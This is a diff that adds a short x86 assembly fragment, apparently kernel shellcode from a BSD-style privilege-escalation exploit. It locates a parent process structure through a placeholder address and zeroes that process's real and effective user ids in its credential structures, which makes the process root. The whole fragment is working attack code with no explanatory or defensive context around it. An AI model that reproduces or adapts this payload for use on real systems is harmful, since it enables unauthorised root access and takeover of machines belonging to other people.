@@ -1,0 +1,19 @@
+call moo
+.long 0x12345678   <-- pproc addr
+.long 0xdeadcafe
+.long 0xbeefdead
+nop
+nop
+nop
+moo:
+pop  %edi
+mov  (%edi),%ecx      # parent's proc addr in ecx
+
+                      # update p_ruid
+mov  0x10(%ecx),%ebx  # ebx = p->p_cred
+xor  %eax,%eax        # eax = 0
+mov  %eax,0x4(%ebx)   # p->p_cred->p_ruid = 0
+
+                      # update cr_uid
+mov  (%ebx),%edx      # edx = p->p_cred->pc_ucred
+mov  %eax,0x4(%edx)   # p->p_cred->pc_ucred->cr_uid = 0
